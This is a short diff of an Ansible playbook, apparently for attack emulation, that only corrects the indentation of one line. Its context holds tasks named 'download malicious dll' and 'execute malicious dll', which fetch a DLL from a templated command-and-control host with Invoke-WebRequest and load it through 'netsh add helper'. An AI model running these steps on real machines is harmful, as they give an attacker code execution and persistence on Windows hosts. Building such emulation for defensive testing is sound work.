@@ -9,7 +9,7 @@
     - name: download malicious dll
       win_shell: Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }}
     - name: execute malicious dll
-       win_shell: |
+      win_shell: |
         cd c:\temp
         netsh.exe add helper {{ cnc_dll }}
     - name: check file exist
